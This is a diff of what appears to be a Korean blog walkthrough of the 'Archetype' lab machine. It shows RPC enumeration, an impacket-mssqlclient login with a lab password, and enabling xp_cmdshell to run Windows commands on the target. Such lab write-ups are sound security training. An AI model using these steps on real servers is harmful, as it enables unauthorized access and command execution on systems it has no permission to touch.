@@ -132,14 +132,165 @@ Couldn't find a valid ICU package installed on the system. Set the configuration
 ![](../assets/image_post/20240216154546.png)
 
 
-그리하여 마지막으로 rpcclient로 해당 계정으로 접근해보았더니, 접근이 된다...! dfsConfig는 SQL 관련 패키지 속성 값인데 왜 rpc와 관련이 있는 것일까......
+그리하여 마지막으로 rpcclient로 해당 계정으로 접근해보았더니, 접근이 된다...! dfsConfig는 SQL 관련 패키지 속성 값인데 왜 rpc와 관련이 있는 것일까......하지만 마찬가지로 별다른 정보를 획득할 수는 없는 것 같다.
 ``` bash
 ┌──(root㉿kali)-[/home/user]
-└─# rpcclient -U sql_svc 10.129.95.187
+└─# rpcclient -U sql_svc 10.129.215.129
 Password for [WORKGROUP\sql_svc]:
+rpcclient $> enumdomains
+result was NT_STATUS_CONNECTION_DISCONNECTED
+rpcclient $> getusername
+Account Name: sql_svc, Authority Name: ARCHETYPE
+rpcclient $> querydomainfo
+command not found: querydomainfo
+rpcclient $> querydominfo
+result was NT_STATUS_CONNECTION_DISCONNECTED
+rpcclient $> enumdomusers
+result was NT_STATUS_CONNECTION_DISCONNECTED
+rpcclient $> srcinfo
+command not found: srcinfo
 rpcclient $> srvinfo
-        10.129.95.187  Wk Sv Sql NT SNT PtB LMB
+        10.129.215.129 Wk Sv Sql NT SNT PtB LMB
         platform_id     :       500
         os version      :       10.0
         server type     :       0x59007
 ```
+
+RPC Endpoint를 열거하기 위해 `impacket--rpcdump`를 사용해보고자 한다. 이거로 획득한 정보는 있지만, 어디에 사용해야할지는 감이 없다.
+``` bash
+┌──(root㉿kali)-[/home/user]
+└─# impacket-rpcdump -port 135 10.129.95.187
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Retrieving endpoint list from 10.129.95.187
+Protocol: [MS-RSP]: Remote Shutdown Protocol
+Provider: wininit.exe
+UUID    : D95AFE70-A6D5-4259-822E-2C84DA1DDB0D v1.0
+Bindings:
+          ncacn_ip_tcp:10.129.95.187[49664]
+          ncalrpc:[WindowsShutdown]
+          ncacn_np:\\ARCHETYPE[\PIPE\InitShutdown]
+          ncalrpc:[WMsgKRpc083610]
+
+Protocol: N/A
+Provider: winlogon.exe
+UUID    : 76F226C3-EC14-4325-8A99-6A46348418AF v1.0
+Bindings:
+          ncalrpc:[WindowsShutdown]
+          ncacn_np:\\ARCHETYPE[\PIPE\InitShutdown]
+          ncalrpc:[WMsgKRpc083610]
+          ncalrpc:[WMsgKRpc084D11]
+
+Protocol: [MS-SCMR]: Service Control Manager Remote Protocol
+Provider: services.exe
+UUID    : 367ABB81-9844-35F1-AD32-98F038001003 v2.0
+Bindings:
+          ncacn_ip_tcp:10.129.95.187[49667]
+
+Protocol: [MS-FASP]: Firewall and Advanced Security Protocol
+Provider: FwRemoteSvr.dll
+UUID    : 6B5BDD1E-528C-422C-AF8C-A4079BE4FE48 v1.0 Remote Fw APIs
+Bindings:
+          ncacn_ip_tcp:10.129.95.187[49668]
+          ncalrpc:[ipsec]
+
+Protocol: [MS-CMPO]: MSDTC Connection Manager:
+Provider: msdtcprx.dll
+UUID    : 906B0CE0-C70B-1067-B317-00DD010662DA v1.0
+Bindings:
+          ncalrpc:[LRPC-5575e284d83e243c4a]
+          ncalrpc:[OLE6330F0E7E7567E176E11548627E0]
+          ncalrpc:[LRPC-e43fa1f5a21c9d351f]
+          ncalrpc:[LRPC-e43fa1f5a21c9d351f]
+          ncalrpc:[LRPC-e43fa1f5a21c9d351f]
+
+[*] Received 266 endpoints.
+```
+
+impacket의 mssqlclient 툴을 사용하여 접속할 수 있었다. `mssqlclient.py -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>`와 같은 형태로 접근하여 로그인에 성공하였다. 
+``` bash
+┌──(root㉿kali)-[/home/user]
+└─# impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.215.129
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[-] ERROR(ARCHETYPE): Line 1: Login failed for user 'sql_svc'.
+
+┌──(root㉿kali)-[/home/user]
+└─# impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@10.129.215.129 -windows-aut
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
+[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
+[!] Press help for extra shell commands
+SQL (ARCHETYPE\sql_svc  dbo@master)>
+```
+
+접속 후 어떤 명령어가 가능한지 출력해보면 아래와 같다. exe\*를 통해 실행하고 enum\*을 통해 정보를 출력. 그리고 익숙한 xp_cmdshell이 보인다.
+``` bash
+SQL (ARCHETYPE\sql_svc  dbo@master)> help
+
+    lcd {path}                 - changes the current local directory to {path}
+    exit                       - terminates the server process (and this session)
+    enable_xp_cmdshell         - you know what it means
+    disable_xp_cmdshell        - you know what it means
+    enum_db                    - enum databases
+    enum_links                 - enum linked servers
+    enum_impersonate           - check logins that can be impersonate
+    enum_logins                - enum login users
+    enum_users                 - enum current db users
+    enum_owner                 - enum db owner
+    exec_as_user {user}        - impersonate with execute as user
+    exec_as_login {login}      - impersonate with execute as login
+    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+    xp_dirtree {path}          - executes xp_dirtree on the path
+    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
+    ! {cmd}                    - executes a local shell cmd
+    show_query                 - show query
+    mask_query                 - mask query
+```
+
+
+xp_cmdshell을 실행하고자 하니 'turned off' 되어 있어 enable_xp_cmdshell을 통해 활성화 해주어야 한다. 그 후 실행 시 정상적으로 결과를 받아온다.
+``` bash
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell dir
+[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+
+SQL (ARCHETYPE\sql_svc  dbo@master)> enable_xp_cmdshell
+[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell dir
+output
+--------------------------------------------------------------------------------
+ Volume in drive C has no label.
+
+ Volume Serial Number is 9565-0B4F
+
+NULL
+
+ Directory of C:\Windows\system32
+
+```
+
+해당 계정으로는 별 다른 권한이 없는 듯하다. 더 높은 권한 획득을 목표로 해야할 것 같다.
+``` bash
+SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell cd C:\Users\Administrator & cd
+output
+-------------------
+Access is denied.
+```
+
+
+
+
+
+
+
+10.129.215.129
